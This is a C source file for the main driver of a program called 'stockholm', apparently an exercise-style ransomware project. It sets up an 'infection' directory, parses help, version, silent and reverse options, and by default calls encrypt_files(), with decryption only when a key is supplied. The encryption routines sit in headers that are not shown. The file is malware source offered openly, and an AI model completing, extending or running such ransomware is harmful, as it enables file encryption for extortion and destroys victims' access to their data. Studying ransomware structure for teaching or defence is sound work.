#include "encryption.h"
#include "utils.h"

#define VERSION "1.0"

void print_help() {
    printf("Usage: stockholm [options]\n");
    printf("Options:\n");
    printf("  -h, --help          Show this help message\n");
    printf("  -v, --version       Show program version\n");
    printf("  -r, --reverse <key> Reverse the encryption with the provided key\n");
    printf("  -s, --silent        Silent mode\n");
}

void print_version() {
    printf("stockholm version %s\n", VERSION);
}

int main(int argc, char *argv[]) {
    setup_infection_directory();

    // Parsing command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_help();
            return 0;
        } else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0) {
            print_version();
            return 0;
        } else if (strcmp(argv[i], "-r") == 0 || strcmp(argv[i], "--reverse") == 0) {
            if (i + 1 < argc) {
                decrypt_files(argv[i + 1]);
                return 0;
            } else {
                fprintf(stderr, "Error: No key provided for --reverse option.\n");
                return 1;
            }
        } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--silent") == 0) {
            // Silent mode logic
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            return 1;
        }
    }

    // Encryption logic
    encrypt_files();

    return 0;
}
